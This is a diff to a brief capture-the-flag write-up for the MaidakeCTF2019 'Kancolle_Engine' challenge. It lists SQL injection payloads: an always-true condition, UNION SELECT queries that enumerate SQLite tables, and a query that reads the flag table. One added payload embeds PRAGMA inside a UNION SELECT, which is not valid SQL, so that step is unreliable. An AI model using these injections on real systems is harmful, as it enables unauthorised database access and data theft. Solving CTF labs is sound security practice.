@@ -15,5 +15,8 @@ https://aokakes.work/CTF/MaidakeCTF2019/Kancolle_Engine/
 
 ## writeup
 1. 1' or 1 = 1 -- 
-2. 1' UNION SELECT name, sql FROM sqlite_master WHERE type='table' ORDER BY name -- 
+2. 1' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, name FROM sqlite_master WHERE type='table' ORDER BY name -- 
+4. 1' UNION SELECT 1, 2, 3, 4, 5, PRAGMA table_info(flag) -- 
 3. 1' UNION SELECT flag,0 FROM flag -- 
+
+PRAGMA table_info('flag')
